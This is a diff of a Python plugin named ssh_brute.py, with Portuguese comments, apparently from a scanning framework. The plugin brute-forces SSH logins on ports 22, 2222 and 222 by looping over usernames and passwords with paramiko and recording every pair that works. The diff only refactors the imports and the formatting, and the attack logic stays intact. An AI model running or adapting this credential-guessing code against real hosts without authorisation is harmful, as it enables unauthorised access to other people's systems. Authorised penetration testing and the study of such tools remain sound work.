@@ -1,18 +1,24 @@
 # plugins/ssh_brute.py
+import socket
+
+
+try:
+    import paramiko
+except ImportError:
+    paramiko = None
+
+
 def run(target, ip, open_ports, banners):
     """
     Tenta brute force SSH em portas padrão e comuns.
     Integrado com open_ports do core.
     Necessita: pip install paramiko
     """
-    import socket
+    _ = (ip, banners)
 
-    try:
-        import paramiko
-    except ImportError:
+    if paramiko is None:
         return {"plugin": "ssh_brute", "resultados": {"erro": "paramiko não instalado (pip install paramiko)"}}
 
-    # Usar portas SSH do core + padrões
     ssh_default = [22, 2222, 222]
     portas = sorted(set(ssh_default + [p for p in open_ports if p in ssh_default]))
 
@@ -28,7 +34,7 @@ def run(target, ip, open_ports, banners):
                     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                     client.connect(
                         target, port=porta, username=user, password=senha,
-                        timeout=5, allow_agent=False, look_for_keys=False
+                        timeout=5, allow_agent=False, look_for_keys=False,
                     )
                     encontrados.append({"porta": porta, "usuario": user, "senha": senha})
                     client.close()
@@ -39,5 +45,5 @@ def run(target, ip, open_ports, banners):
 
     return {
         "plugin": "ssh_brute",
-        "resultados": encontrados if encontrados else "Nenhum acesso SSH padrão identificado"
+        "resultados": encontrados if encontrados else "Nenhum acesso SSH padrão identificado",
     }
